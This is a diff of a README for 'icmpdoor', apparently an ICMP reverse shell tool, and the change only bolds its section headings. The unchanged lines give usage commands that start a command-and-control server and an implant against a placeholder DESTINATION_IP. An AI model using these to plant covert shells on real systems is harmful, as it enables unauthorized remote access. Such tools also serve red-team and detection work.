@@ -3,25 +3,25 @@ icmpdoor is written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 10 (Kal
 
 Read [this article](https://cryptsus.com/blog/icmp-reverse-shell.html) for more information.
 
-Python version usage (both Windows and Linux):
+**Python version usage (both Windows and Linux):**
 ```bash
 ./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
 ```
 
-Binary Windows version usage version:
+**Binary Windows version usage version:**
 ```bash
 ./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
 ./icmpdoor.exe -d DESTINATION_IP (Implant)
 ```
 
-Binary Linux version usage version:
+**Binary Linux version usage version:**
 ```bash
 ./icmp-cnc -d DESTINATION_IP (Command and Control)
 ./icmpdoor -d DESTINATION_IP (Implant)
 ```
 
-Parameters details:
+**Parameters details:**
 ```bash
   -h, --help            show this help message and exit
   -i INTERFACE, --interface INTERFACE
